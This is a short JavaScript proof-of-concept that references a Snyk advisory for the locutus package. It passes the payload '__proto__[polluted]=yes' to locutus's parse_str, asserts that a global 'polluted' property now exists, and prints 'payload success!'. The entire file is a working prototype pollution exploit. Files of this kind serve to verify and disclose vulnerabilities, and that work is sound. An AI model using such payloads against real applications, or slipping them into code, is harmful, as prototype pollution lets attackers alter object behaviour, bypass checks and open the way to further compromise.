//https://snyk.io/vuln/SNYK-JS-LOCUTUS-598675
const locutus = require('locutus');
const assert = require('assert');

var obj = {}
console.log("Before : " + obj.polluted);
locutus.php.strings.parse_str('__proto__[polluted]=yes');
console.log("After : " + polluted);
assert(polluted === "yes");
console.log("payload success!");